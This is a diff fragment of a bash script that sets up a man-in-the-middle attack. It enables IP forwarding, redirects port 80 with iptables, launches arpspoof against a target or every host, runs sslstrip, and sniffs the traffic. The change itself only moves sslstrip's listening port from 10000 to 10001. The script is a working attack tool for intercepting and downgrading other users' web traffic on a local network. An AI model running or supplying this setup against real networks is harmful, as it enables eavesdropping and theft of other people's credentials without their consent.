@@ -32,7 +32,7 @@ function run() {
     # IP_FORWARD
     echo 1 > /proc/sys/net/ipv4/ip_forward
     #Redirect port 80 traffic to port 10000
-    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10001
 
     # Run arpspoof in separate window
     if [ "$TARGET" == "ALL" ]; then
@@ -43,7 +43,7 @@ function run() {
     xterm -T "ArpSpoofing $TARGET" -geometry 100x15 -e $command &
 
     # Strip that SSL! in a separate window
-    command="sslstrip -a -k -f"
+    command="sslstrip -a -k -f -l 10001"
     xterm -T "SSLStrip" -geometry 100x15 -e $command &
 
     # Sniff the trafic and show it in the console
